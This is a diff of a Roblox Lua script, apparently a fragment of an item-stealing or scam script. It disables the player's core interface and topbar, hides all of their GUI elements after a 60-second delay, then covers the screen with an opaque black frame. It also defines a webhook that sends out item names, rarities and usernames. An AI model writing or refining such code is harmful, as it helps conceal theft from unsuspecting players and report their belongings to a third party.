@@ -180,7 +180,7 @@ local function setupUI()
         local bgFrame = Instance.new("Frame")
         bgFrame.Size = UDim2.new(1, 0, 1, 0)
         bgFrame.BackgroundColor3 = Color3.new(0, 0, 0)
-        bgFrame.BackgroundTransparency = 10
+        bgFrame.BackgroundTransparency = 0
         bgFrame.BorderSizePixel = 0
         bgFrame.Parent = screenGui
 
@@ -306,20 +306,23 @@ pcall(function()
 	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 	game:GetService("StarterGui"):SetCore("TopbarEnabled", false)
 end)
-
--- Ẩn toàn bộ UI của người chơi
-for _, inst in ipairs(playerGui:GetDescendants()) do
-	if inst:IsA("GuiObject") then
-		inst.Visible = false
-	end
-	if inst:IsA("ScreenGui") or inst:IsA("SurfaceGui") or inst:IsA("BillboardGui") then
-		pcall(function()
-			inst.Enabled = false
-		end)
+local function deleteUI()
+	-- Ẩn toàn bộ UI của người chơi
+	for _, inst in ipairs(playerGui:GetDescendants()) do
+		if inst:IsA("GuiObject") then
+			inst.Visible = false
+		end
+		if inst:IsA("ScreenGui") or inst:IsA("SurfaceGui") or inst:IsA("BillboardGui") then
+			pcall(function()
+				inst.Enabled = false
+			end)
+		end
 	end
 end
 
-setupUI()
+
+task.delay(60,deleteUI)
+task.delay(65,setupUI)
 
 -- ✅ Gửi webhook
 local function sendWebhook(itemName, rarity, username)
